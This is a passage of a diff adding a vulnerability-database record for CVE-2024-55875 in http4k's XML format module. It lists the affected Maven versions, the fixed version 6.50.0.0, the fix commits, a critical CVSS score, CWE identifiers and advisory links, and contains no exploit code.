+      - pkg:maven/org.http4k/http4k-format-xml@4.23.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.24.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.4.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.5.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.5.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.7.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.8.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.9.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.10.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.10.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.11.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.12.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.13.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.14.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.15.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.16.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.16.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.25.16.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.26.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.27.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.27.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.27.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.27.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.27.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.28.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.28.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.28.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.29.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.29.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.7.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.8.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.9.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.30.10.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.31.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.32.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.32.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.32.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.32.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.32.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.33.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.33.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.33.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.33.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.33.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.0.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.0.3
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.0.4
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.3.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.34.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.35.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.35.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.35.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.35.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.35.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.36.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.37.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.38.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.38.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.39.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.40.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.40.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.40.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.41.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.41.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.41.1.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.41.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.41.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.41.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.42.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.42.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.43.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.43.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.44.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.44.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.45.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.46.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.47.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.47.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.48.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.48.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.0.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.1.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.1.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.1.1.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.1.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.1.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.2.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.2.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.3.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.4.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.4.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.5.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.6.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.6.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.6.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.6.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.6.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.6.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.6.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.7.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.7.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.7.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.7.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.7.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.8.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.8.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.8.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.8.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.8.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.8.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.8.5.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.8.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.9.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.10.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.10.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.10.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.10.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.10.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.10.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.10.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.10.7.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.11.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.11.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.12.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.12.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.12.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.12.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.4.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.6.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.7.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.8.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.13.9.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.14.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.14.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.14.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.14.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.14.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.15.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.16.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.16.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.16.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.17.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.18.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.18.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.19.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.20.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.21.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.21.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.21.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.22.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.23.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.24.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.24.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.25.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.26.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.26.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.27.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.28.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.28.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.29.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.30.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.30.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.31.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.31.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.32.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.32.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.32.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.32.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.32.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.33.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.33.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.33.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.34.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.34.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.35.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.35.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.35.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.35.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.35.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.35.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.36.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.37.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.37.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.37.1.1
+      - pkg:maven/org.http4k/http4k-format-xml@5.38.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.39.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.40.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.41.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.42.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.43.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.44.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.44.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.44.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.44.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.45.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.45.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.45.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.46.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@5.47.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.0.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.0.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.1.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.1.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@6.2.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.3.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.4.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.4.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.5.1
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.5.6.1
+      - pkg:maven/org.http4k/http4k-format-xml@6.6.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.6.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@6.6.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.7.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.8.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.8.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.9.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.9.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.9.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.10.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.10.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.10.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.11.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.11.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.12.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.13.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.14.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.15.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.15.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@6.15.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.16.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.17.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.18.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@6.18.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.19.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.20.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.20.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@6.20.0.2
+      - pkg:maven/org.http4k/http4k-format-xml@6.20.0.3
+      - pkg:maven/org.http4k/http4k-format-xml@6.20.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.20.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.20.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@6.21.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.21.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.22.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.23.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.23.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.24.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.24.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.25.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.25.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.26.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.26.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.27.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.28.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.28.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.29.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.30.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.30.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.31.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.31.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.32.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.33.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.34.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.35.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.36.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.37.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.38.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.39.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.39.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.40.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.40.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.41.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.42.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.43.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.44.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.45.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.45.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.46.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.46.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.47.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.47.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.47.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.48.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@6.49.0.0
+    fixed_packages:
+      - pkg:maven/org.http4k/http4k-format-xml@6.50.0.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/http4k/http4k
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/http4k/http4k
+        commit: 25696dff2d90206cc1da42f42a1a8dbcdbcdf18c
+        patch_text:
+      - vcs_url: https://github.com/http4k/http4k
+        commit: 35297adc6d6aca4951d50d8cdf17ff87a8b19fbc
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-7mj5-hjjj-8rgw/GHSA-7mj5-hjjj-8rgw.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-200
+  - CWE-918
+  - CWE-611
+references:
+  - url: https://github.com/http4k/http4k
+    reference_type:
+    reference_id:
+  - url: https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46
+    reference_type:
+    reference_id:
+  - url: https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-55875
+    reference_type:
+    reference_id: CVE-2024-55875
+  - url: https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw
+    reference_type:
+    reference_id: GHSA-7mj5-hjjj-8rgw
+exploits: []
